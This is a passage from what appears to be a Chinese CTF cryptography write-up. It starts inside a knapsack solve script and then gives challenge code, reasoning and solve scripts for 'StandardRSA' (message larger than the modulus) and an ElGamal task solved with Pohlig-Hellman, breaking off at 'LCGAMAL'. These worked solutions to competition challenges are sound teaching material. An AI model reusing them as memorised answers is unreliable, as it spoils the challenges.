class="hljs-number">247524401458857756272122726667927654879310981530406569779075639645568437355162177278486754130771608033452929138042727413668538783187362008984015905271992328</span>, <span class="hljs-number">123975429842848420134257963781801556804543708809828003972363442798636322960670669334369948720153951124347496653803402221050539862413384577024852851884660365</span>, <span class="hljs-number">303491675740597062418273146410652460556869594007303046254575721910930748582092944478952355222152020781685974457052486098142888342138541347342624910753172098</span>, <span class="hljs-number">391858661806833978460762659174859000129639950785757976963671421658661090544402246259062632652610245408275242808074084828919469216706276540084322680991624027</span>, <span class="hljs-number">545899491943331948297002978889783533969056970445210680234640720774709723991913004300661937335319724900033359075480509760262347396126727518350459821776400868</span>, <span class="hljs-number">610118155193335708824707432866199098799940486196430931139865001834452790548133981835689475790036377711862456690955320554805733874062378980935067322397486069</span>, <span class="hljs-number">430499876420509591800690043279054276455418335358927323881750923423309956012268463764838809212166722775243309560233638591282449988068349493416493040837428526</span>, <span class="hljs-number">414126611957026510341700697416043036162960684959146598323385272219514374260629568319683385979442237971922690766190842961812235523557989412556587520114821504</span>, <span class="hljs-number">221762996722236337707667546116321271788714507133147103746873645525171589091402571127832377134338058189760397254188844590807790818910870055985079996178588406</span>, <span class="hljs-number">200680041982045288490632459252829476007814491955646457918608720853345144069644007866981689825705835832176551778885871280623494270992827771091639980783441023</span>, <span class="hljs-number">347762786740234156312482131744472831396370333147041833744676774470888561610455288633545684787543103151187631871391852137315707413478003715596578766818454613</span>, <span class="hljs-number">437009970733569752616677833504834660695807624004990657042630121743945437624103302527287404047618635742248584185197597611431626221927432920527563173319267946</span>, <span class="hljs-number">153536753547665784269552015677288782325286830362047153575828849274164362270631925695874598170429788024938830916343817980726186952710554369338922221092387093</span>, <span class="hljs-number">158812051840217635345337769072965664545536301818836643843078651987828666463456195610764354230432755606029555401312350424360060738654500594370293379180984551</span>, <span class="hljs-number">606269371808080324000385618055310949352139461897387721729651952087956510860386115251654842051266419874322262606498397334128063916887589989699622715537820199</span>, <span class="hljs-number">86510652130823749918755577230633070257519444435729448365710432354264506030633588743315855199974302846540197329765852416504975671363177534731271499415734987</span>, <span class="hljs-number">529538130470546754675086640976485216045633715979486972078208401825410340147603792940683339761009094402473956746631582132964629153063501188363182103503836215</span>, <span class="hljs-number">65309885571888621924044109422181747317812511674977392625727074516689632476670021953970507032528884248216798503600218305184012135671763228829928843396451040</span>, <span class="hljs-number">214293037845161750911083059138383366337716267169306161885318020203744816514786394841866728627371459298547350425917243821355625928392164337575783206474509155</span>, <span class="hljs-number">159843944195520959951977229219891818305043623186837805655872227078646807118795349998396722947704616285909829656539814877913822984658362603711961215801251541</span>, <span class="hljs-number">358450382033881322912625454696366411429559178073772796273532527192206386460556937343918955788723134700049129340106155325927929654430582791439332732233132183</span>, <span class="hljs-number">572789769394361277817567646182349623025106731589841166340598668705427069855948600329837585584597904079196745736427141877136041054575959680302874295827485134</span>, <span class="hljs-number">568331180141441599447152057647110069203893472141113984206122442733664025995820185123143005266845686203489854578137493228908395051790178240408092377253812825</span>, <span class="hljs-number">598833287970880678254006269682543327948065308914915015076127962375321313069903062527974980072804841366137331485777050119358607222811031070747950040926630213</span>, <span class="hljs-number">461689128492113134993481039023650443971869643837936469311699890634981877483344869242475919229713419678251819518376503006992304500259259820072674501783980996</span>, <span class="hljs-number">542069022390263860884705312258829445792036313512834994386870713855938197408315690927929413307512463696099391629150103942025227322813359926185722833713681845</span>, <span class="hljs-number">373030930588346383178123855680407995404982789773663210646909635443322935757324123896769368581011559494330185308815664409515348954552775607699241068081349499</span>, <span class="hljs-number">302734759514085096862201670717101245565998071397306964201617152675933515175522580292696046741897882638937128659473543065399529190076150816272603939013945898</span>, <span class="hljs-number">314357346902912554765325827123641804374725163904138652881012658927654979897917859734726194374129600080757503428026989249002320089521315111248004962289121842</span>, <span class="hljs-number">402638966309036197431611386615773789778894094733617566907836716134747938721007884922966223338900425266699399029507153018302782400163525657859748409275408589</span>, <span class="hljs-number">228011655734228804240899653231782859980328550276347725802909743963059933797831931031250561704471231155114491574359618457468240963322510217433894326742489036</span>, <span class="hljs-number">550195678908793070295757085593386229777727466791986365910588894073249850656531300152920034896539595768672947035503008132327404554977691438003318831391562465</span>, <span class="hljs-number">538435992444333013423661468119530895281114848888368932782268740862074816064173723152925818303968926152190083205486892768289769770867000639912352051423505736</span>, <span class="hljs-number">520369169163506861473747394037050386504114192893600767489673134694150223349051878274868853008570139078342054661274669317782048421555700430016374586361591752</span>, <span class="hljs-number">106775211999932339398437592558088121653817576411630399132170830650291600124591023380291663261011036349376734368844235618960462546628249162702446777797889916</span>, <span class="hljs-number">351606545816842149424067364463124236663210071541350943568809515324432620535469009159775856910031712473874480464426620805242501104696026514843052427525216773</span>, <span class="hljs-number">286998365231532898362252996540598911386642095527803096982556962156532032552151160934955276129937543713472480483067307093889895089999877936757712137436941089</span>, <span class="hljs-number">427103626623818118001747641082692167468741869544767730329384188919691994794377951527038357958164983855317236150698913042995838365330529907219855591239146443</span>, <span class="hljs-number">526688864448485313309966345127615829348905851226670347992002227094599966606620074142223919101653027385795881527642918556086167447755086018846796819708709404</span>, <span class="hljs-number">534468472700532695389901720055971740846426779150870338948195829271610424424419007500753020003911268479246700182020780862202345962232691341220342469895912868</span>, <span class="hljs-number">68315077272532647340076658186634389691824204878493066076112573580110616870743986184623183998740160678467561807583173305644329620636519547723594775796872189</span>, <span class="hljs-number">243307116673068615779685989169827813354755618536283149968750094443576240021408971293354888170473377358273415677314922392076596361852137420094984120751989733</span>, <span class="hljs-number">613617663932581828320478745636552013543701653779570837747854193950462976000101090620155298795406582820160846696906461385268208474228608678432474699924024797</span>, <span class="hljs-number">473364399491521014432679805594484959286887601388754333040812779746776033871324331879944622679135572792055946069671550429980302268776363153032879293789925820</span>, <span class="hljs-number">82308809404143167166285070066842770026512607696178218382135426822444112281697087811310223621183492147928273283971701284841794315636383689407103008123926507</span>, <span class="hljs-number">100582830696236316322821140867198207456057356073225962976637707283377573495006299164242671771433389839346248477026182453739559942577600413741626134252718372</span>, <span class="hljs-number">598952071728065114532026697899926686362885222210611841260750797286717813700854807390369692087330946157088777980655866746692567475867961401922212689989364290</span>, <span class="hljs-number">458224826398931746956486731979144891191862745683588761345335332591409812229798341770037199081229467657185810003236503494222025704432259330138900388196692973</span>, <span class="hljs-number">604658667647441040306999092427983579367645212260937958928981677877158281353885468916873508912251496773113880468040034479238887275474228069600643053842266247</span>, <span class="hljs-number">589274513499909384773368093832228988983044914891972535328330227609365988704843761617884577126572545706609919979345033547095695756831829989308261183680287824</span>, <span class="hljs-number">480107974433295435918296993572228788880814900834815743486863844513523211967047644274028450519778787604582571766924431501844887116511673242675176889007731975</span>, <span class="hljs-number">467933038879244536314085304221284492863838960604706117813113375216509702174270339707048532275632982470996761086195414236701167684709674711784456163129675251</span>, <span class="hljs-number">203732081902062250419357653332698140265907271040316040709966198908425179912783242291994162735731822245343364919316385103110560537853196036023641914833384003</span>, <span class="hljs-number">185173008988701739953479660818627477398110504953139092604318027343975442946557120882911581446931849221138593511980740228397393411279293947858174326855230008</span>, <span class="hljs-number">131675684582408854774126622723833367625427349994611745201263634937280036907235900136470292246232988938926103650313250188643470064577662810424236037828468030</span>, <span class="hljs-number">626312550518287991409109152629401654519618321627967331355611731629393882930243474741044871114770300511036435377064912135039550432791759558162854816025150817</span>, <span class="hljs-number">33596067041408658440933039033617722616499636838127322197980186098855644497413967766468050897209974915178357390703855843790787546784070318174541745311908762</span>, <span class="hljs-number">202526727832858822628355112140675608363630719455118971238102853678517866023583398314875311666630233555093867657141764943188753793412584523459457117408074390</span>, <span class="hljs-number">410548485687038079422099859630626361582999593205877078030086272993123160754748028808895186451066045543606328003926218659145406047828750672547237246766439824</span>, <span class="hljs-number">410142889913206074121772456972790966288735256192461128087806343066325456307458477946618883076843261520428566872924311982379028977573960784851820878549225195</span>, <span class="hljs-number">122278171362415308190076492062948326089737082327203194704915656508591403352606905472675759959880443892298331625472258127022890899826785640411453371204905319</span>, <span class="hljs-number">43778820174063973541517825268888191955779405075734642119990468792005591770351951213170059547429465014439047925187374702817308320307273129220584523232449147</span>, <span class="hljs-number">24620179526737023203674142050689613728991600185375969621208019999295004085232797296956517319588072331078855555075309738049218949051196876979317298474905212</span>, <span class="hljs-number">234593496436502692967268373701297367552974575213848479393604876713420748016011627673823390536879807360677070945164394180579884251128692158705248113335492933</span>, <span class="hljs-number">424466833249547335522938676285054266262136918844917069450311088555084423708456171454924014753110790307657857201445819034873575164207559810285057193334059934</span>, <span class="hljs-number">423893831716679434002698923752818050143225906215077897138014711247023574325253154794639743874529512829509367480021708181355839841707188947863501261529043406</span>, <span class="hljs-number">49621165884870081796238397159533096402390218648679874091959366344767294327958350819892623519426990617256824573452131857331943006517636555082736491751548394</span>, <span class="hljs-number">425785909183773163298870612833803832468171606274953895752893575111672285861808362598468861783378379111604687231209695436977207806612377987152593644974555702</span>, <span class="hljs-number">247700936110514316335816500028814943312349987125826422118250614170475753541454094917134906574472854100155895752284403383896458677357319032713453672702292852</span>, <span class="hljs-number">476176280401643939970713853717897788034207329678421825980918701953388963862318569570078196850469094156410395947755865641120056557096805545600611596062859850</span>, <span class="hljs-number">595942799759982434310815386253833104959264723037570720903753266205708698125322827492888593378853691048368082698689429341066979065291441031269035774787848194</span>, <span class="hljs-number">227335008403577815289004908844714752164941474868686795337360380834818389976603858881217743361436116280906889722342142194970410104530611089268201064006727240</span>, <span class="hljs-number">294475171902199543911673842878170856422541801071007579638660080843952787414133410258836596502706744292767065774104927469961134943621487620494600725185335093</span>, <span class="hljs-number">504657830357261550204123384155279932048388394840751585890069904780121878210168597836947569575612627542383912252544122238680889255842911235864535595804442473</span>, <span class="hljs-number">123618893886256680689492972414536855343009874728984214723371187372371559017400340205649436646724764351420700274890928048314735629560293604839112507976542658</span>, <span class="hljs-number">144233521727704386549303320253825018163529386246443158431598082626369370733206344547862984626454145556658554966362472721680582681917585752685291981975051399</span>, <span class="hljs-number">468700287792297434144725073756610319600730803831672380833981751096192777305193276174823845298767404216573861229823548943962038747140832005801894641148194438</span>, <span class="hljs-number">360021194137471632311945269649453888628074192715124921464539045966384883189546688254652272008683590729394863380942342038275263781559238107896987125599602483</span>, <span class="hljs-number">9794460235465554331159958985600948940043239277811962612206542035810111157574794598799541419127920504345906815087573174477732510996620908014911532274336593</span>, <span class="hljs-number">496184287815812758880746208172269690775808466764413116878426077565414251613486369473260889935546618958391520838394054317302933313497769946297998283660535006</span>, <span class="hljs-number">375034096466177534772620301216645581475068062942309762061356801765914158724497711056946102460258475536255941444296262906800165900520143547314029294178918984</span>, <span class="hljs-number">83578918945090748538767703538385463417799162341741990755007914664207967790581609681198852136886502755147333033312467099719582625381145023996792645071127660</span>, <span class="hljs-number">481785162081270700829721546755154278038286168971257199103177897012399245231770921902616431352370606828602207651506642251825314265331339736043767348294713962</span>, <span class="hljs-number">464934814020762462589403725304178866133776592320115003139549110183309337156487696532687296784797283377213307028847125445142821602683207175993762479145705352</span>, <span class="hljs-number">421079825557712831650848423859531934111152831350534941756065225121212805595293259723574964575039096598502242500155474608857062348638608930406544118200487634</span>, <span class="hljs-number">198362189120777947420663951717805171921258682196924252426868216823117260232048827747288482245273102034752373979580424106596979249257835908872141268918847381</span>, <span class="hljs-number">611601960322638911046114789002817661499768566193108792817068180733729758360979556558011622774584672041208575102964169070371049291564904087732613054221105489</span>, <span class="hljs-number">283628564080950885802996568067146552580775832530112587609483224303778863025145712572172242292581751337284664197677041792418452388453743309919973170635326844</span>, <span class="hljs-number">80457652729048973903631493155303826820654071085298756175722755047019139331082781168798358271919763838526600601990470778438399350721345036601645043500986895</span>, <span class="hljs-number">588639052877508689856623690107590138174179437544872612493236582778422297366871329910635454584209702639590949187356449452872585476553096543358587366475156095</span>, <span class="hljs-number">392575044459082979934009523951801274526432846128777691072936032351249246903166956223331948226034267423493197695176748297468919865725970605667254045109876567</span>, <span class="hljs-number">341163061579084206668850901304745901467746838532908448713712445405218993397577275473785148743700048718996537676901711738778405413554253743271580828506448444</span>, <span class="hljs-number">146663815305537228531799210158963007023004667558955323042825692657228237712755205308257844612752246229325315985931546082014940127509566589836683507866784150</span>, <span class="hljs-number">266948848258687056791818173826484625801849102578999054424930370456298648095033027455168231137419084160714847286062742860736067108970832705279884811220152935</span>, <span class="hljs-number">315508383040249165814570813092408413184381762105090072013429328102585152485002531868016303230226317334004314956086141331754760573331067478198388598446514425</span>, <span class="hljs-number">83451922358124750139482600250084948033787419546090325585288220900401464399275717912860142666054861177194901801757731134409000052116995015890423746604379174</span>, <span class="hljs-number">452113485787509842228792995430357771044000187298910774099695116582871098496247327065265684560077675970391826303895310629093368390395840582013678672298979840</span>, <span class="hljs-number">192977862386482567944900344305517878622765301051326952847631818120406032629045009393125063590720102116725171513368406596671686886095167302082799405545350857</span>, <span class="hljs-number">101511339824531515096841442225762534293321955819909141327856237163896065492413547345387945924342153474508984013570132802982212493801830236574520199716499730</span>, <span class="hljs-number">547673185500805365725031923436630873456479751927865520531662177599296568464508670028502029591842499345554999026386621984814058927566414770926091560033272036</span>, <span class="hljs-number">340650340843257279112322912833691923237761934048053648009089222160802547085726370770416709358346196086893211986054397315682859143987863729415228652266617319</span>, <span class="hljs-number">139546569949460533058609275431776648368698491594909649691401799444304372809416319013258630173419437277066097498953741908734593683643739711393124504167970215</span>, <span class="hljs-number">513123526210939277904939608381937011410399149246897334122058292964031048048175513580615352168881288692099261375159235365563107612409044985151817489122806992</span>, <span class="hljs-number">394307146044339924045401943041229168461398644121027856494844415337017334590509825271228289320333593536968774116670366206376632880058229583437878108577981182</span>, <span class="hljs-number">591350499718341851936166378255483883048497019757533989721798640205000620344402654533044801275905441432117572130641601885340089672881374156251060611108960414</span>, <span class="hljs-number">150850471030525115108734155218069314737992840210007568919487051028283574550258561733521903549685129897958404289999323611328332588478840696968210386778996203</span>, <span class="hljs-number">252381207475431806958715313480618841717428865129403250447789748740768022910308129091024619630958725699604414443737661749176271839418198710379052142954396830</span>, <span class="hljs-number">84400426281854691326046367781077405020239344846199494441477106021975322588492173948665838744136818610606771123385233310784005922099283528089635768304468681</span>, <span class="hljs-number">503146379407812755888443355950444585606874927606579215796146138930590813825448770171016158475464676580511833797434983190183126681565414159147130597622762136</span>, <span class="hljs-number">493111949340975765259270510466721887847738801196465645622873205284536473026214669999271475821678192776023856031145994111689699665581640472076878622122649217</span>, <span class="hljs-number">191794793043773164702155682177498429599159111908706153951075739575397569857714068123675631826457528810352447996109742404124369517503181292003507140618942203</span>, <span class="hljs-number">43967405340505785755215500851115774842113895936176349411512492343532678142115321057746078783263385489709276711277658252583017166404397429867292593143024815</span>, <span class="hljs-number">611734105695501338960555656516658373960757754253788829708349626517949396385295404497372853961670175895111816970174158947477023059191034910518663780903394284</span>, <span class="hljs-number">406807934483556676723848810472365429475802391637561671753299275156092362922562218291691250861041170704995818473908752617511899436637764778963834368323523326</span>, <span class="hljs-number">375150230426277542414263215741289314302516374886199648525693131986368214566854305254092405837471110546003889594464011043528163414472162438667734983369538615</span>, <span class="hljs-number">11934461814798569950870935990237050258738699627589361089092849425430554134477388475667064467532484135260717931093708490041408361310613155317724545391530776</span>, <span class="hljs-number">230000185910271819756066696377658476258538655823231452421112407369239768355553770966392735969807833354077948868925072659916015401601877408469037133208414362</span>, <span class="hljs-number">244136033441996435421452231131096157385711275845341378513207352363855811731627371352561773916358568648372264443643548672120748647700085220185452979838664473</span>, <span class="hljs-number">216459789562675536216621324907190534466023009293344921900061310001201300139096572143170781862031937656324089264736243855139420216658761202805038553301166668</span>, <span class="hljs-number">211410092268353227246688523210304774919220280352353832507851217644889855008385930377486484758101990751918970991217582515805263988102283713019530332069699430</span>, <span class="hljs-number">571866349580096478514185650108166756581124529265967898988395999307548344516104406299266602251669087062292521819544525317114339561550297079795354629133284404</span>, <span class="hljs-number">449381055269987650629233558856165179182103716895738169021267665746916341545033300548646095266227981755812511151866481116883662111957964316587156376579046385</span>]<br>enc= <span class="hljs-number">447656773759696377167031447283254705301534680469710769705934769573534603248930265716543117496622313565927565321549718858513806325078848873919486040210172673</span><br><br>A_inv=gp.invert(A,n)<br>enc=A_inv*enc%n<br>dp=[<span class="hljs-built_in">int</span>((A_inv*i)%n) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w]<br>len_m=<span class="hljs-number">42</span>*<span class="hljs-number">8</span><br><span class="hljs-comment">#print(len_m)</span><br>m=[]<br>msg=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len_m-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<span class="hljs-comment">#从最大的开始遍历</span><br><span class="hljs-keyword">if</span> dp[i]&lt;=enc:<br>m.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br>enc=enc-dp[i]<br><span class="hljs-keyword">else</span>:<br>m.append(<span class="hljs-string">&#x27;0&#x27;</span>)<br>m.reverse()<br>m2=<span class="hljs-string">&#x27;&#x27;</span>.join(m)<br>m2=m2[:<span class="hljs-number">335</span>]<span class="hljs-comment">#因为flag的2进制可能由于最前面一个字符不够8位前面有0而省略前面的0，使其位数没有336</span><br>m2=<span class="hljs-built_in">int</span>(m2,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><h2 id="4-StandardRSA"><a href="#4-StandardRSA" class="headerlink" title="4.StandardRSA"></a>4.StandardRSA</h2><p>描述：标准RSA？ 解出的结果为什么奇奇怪怪呢？</p><p>提示：m的范围要小于n，如果大于如何处理?</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">42</span><br>e=<span class="hljs-number">0x10001</span><br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">160</span>)<br>q=gp.next_prime(p)<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n= 1938198674432811161450690669878250944830265839396906617662062291196152960227589796372087441130963</span><br><span class="hljs-string">c= 90170164274936424192415483102025065297184726282389841586708984518420677588910796600189918035116</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>由于m大于n,所以解出来的是m%n,爆破加上多少n就行了。根据开始解出来的m的字节长度为40,说明还要乘一个2^16次方大小的数，由于n是320bit(40字节)，大概要加上2^16-1左右大小的数乘n(不估算的话直接爆破也很快)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>e=<span class="hljs-number">0x10001</span><br>p= <span class="hljs-number">1392192039351184898683133411027632038420000086303</span><br>q= <span class="hljs-number">1392192039351184898683133411027632038420000086221</span><br>n=p*q<br>c= <span class="hljs-number">90170164274936424192415483102025065297184726282389841586708984518420677588910796600189918035116</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">14</span>,<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br>M=m+i*n<br>res=long_to_bytes(M)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> res:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="5-Eigamal"><a href="#5-Eigamal" class="headerlink" title="5.Eigamal"></a>5.Eigamal</h2><p>描述：选择合适的算法求解DLP</p><p>提示：Pohlig和Hellman认为你可以</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>m=bytes_to_long(flag)<br>x=getPrime(<span class="hljs-number">80</span>)<br>g=getPrime(<span class="hljs-number">256</span>)<br>p = <span class="hljs-number">135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721</span><br>y=<span class="hljs-built_in">pow</span>(g,x,p)<br><span class="hljs-built_in">print</span>((y,g,p))<br>r=getPrime(<span class="hljs-number">300</span>)<br>yr=<span class="hljs-built_in">pow</span>(y,r,p)<br>c1=<span class="hljs-built_in">pow</span>(g,r,p)<br>c2=(m*yr)%p<br><span class="hljs-built_in">print</span>((c1,c2))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(41318946494679095834478681448121630001086130841852662720404726660963599574714625888075536763080767861967564628282819187513583578016599424899255261884460711377363184458056815695957899698623196649163025084549601980034261300843373884410349828848094416989357511761074392171444577468186199219977721684920814583821, 86058010920482240250386428671252846947337112911812123754576629247785642290091, 135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721)</span><br><span class="hljs-string">(67907516463969303553847214195681281286851073187913016728418259178657611879113546322028132333364129642933502354659664440694336793165751536706564661833013806373959673243309102484514408797342586955400062728025545698058765908182316208081363551154030775593796881798814049319266049284052907737562845114993078010738, 23930883705290957725930522729990791903269170881599104070046823930856753773737144256697095429317242744868581724485712417483557203557761261787440684206894142356346279881538041022251018047418772773298927944622910700355425693696856849328927040428664904968463594290119070986886416707665433720257736910391332671869)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>考察Pohlig-Hellman算法解决离散对数问题,但这里的p-1仍然有大素数因子，但由于x只有80位，ph算法最后其实是由中国剩余定理求解，可能不需要所有的式子，提示也说，大素数的因子可能对求出x没什么作用。可以忽略大素数因子，而且其他素数因子相乘位数为94，超过80，甚至可以不用取所有，为了算法编写的简便，2^3没有用于形成一次同余式。对于ph算法，只是让大问题变成若干个小问题，对小问题可以用大步小步法求解，而sympy模块中的discrete_log函数正是用大步小步法求解对数(开始我想直接用爆破求小问题，但明显小问题还是离散对数问题，爆破去求显然没有达到减小规模的目的)</p><p>p-1的分解结果</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212040041900.png" alt="image-20221204004146816"></p><p>exp(求出私钥x):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PH</span>(<span class="hljs-params">g,h,p</span>):<br>    fac=[<span class="hljs-number">5</span>,<span class="hljs-number">263</span>,<span class="hljs-number">587</span>,<span class="hljs-number">28142457071</span>,<span class="hljs-number">395710839697</span>]<br>    Lg=[<span class="hljs-built_in">pow</span>(g,(p-<span class="hljs-number">1</span>)//i,p) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fac]<br>    Lh=[<span class="hljs-built_in">pow</span>(h,(p-<span class="hljs-number">1</span>)//i,p) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fac]<br>    length=<span class="hljs-built_in">len</span>(fac)<br>    La=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        m=sympy.discrete_log(p,Lh[i],Lg[i])<br>        La.append(m)<br>        <span class="hljs-comment">#print(m)</span><br>    res,mod=crt(fac,La)<br>    <span class="hljs-keyword">return</span> res<br><br>p=<span class="hljs-number">135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721</span><br>g=<span class="hljs-number">86058010920482240250386428671252846947337112911812123754576629247785642290091</span><br>h=<span class="hljs-number">41318946494679095834478681448121630001086130841852662720404726660963599574714625888075536763080767861967564628282819187513583578016599424899255261884460711377363184458056815695957899698623196649163025084549601980034261300843373884410349828848094416989357511761074392171444577468186199219977721684920814583821</span><br>result=PH(g,h,p)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#948628365660824171168731</span><br></code></pre></td></tr></table></figure><p>exp(求解密文):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>x=<span class="hljs-number">948628365660824171168731</span><br>num=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:])<br><span class="hljs-built_in">print</span>(num)<br>p = <span class="hljs-number">135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721</span><br>c1=<span class="hljs-number">67907516463969303553847214195681281286851073187913016728418259178657611879113546322028132333364129642933502354659664440694336793165751536706564661833013806373959673243309102484514408797342586955400062728025545698058765908182316208081363551154030775593796881798814049319266049284052907737562845114993078010738</span><br>c2=<span class="hljs-number">23930883705290957725930522729990791903269170881599104070046823930856753773737144256697095429317242744868581724485712417483557203557761261787440684206894142356346279881538041022251018047418772773298927944622910700355425693696856849328927040428664904968463594290119070986886416707665433720257736910391332671869</span><br>ry=<span class="hljs-built_in">pow</span>(c1,x,p)<br>d=gp.invert(ry,p)<br>m=(c2*d)%p<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="6-LCGAMAL"><a href="#6-LCGAMAL" class="headerlink" title="6.LCGAMAL"></a>6.LCGAMAL</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 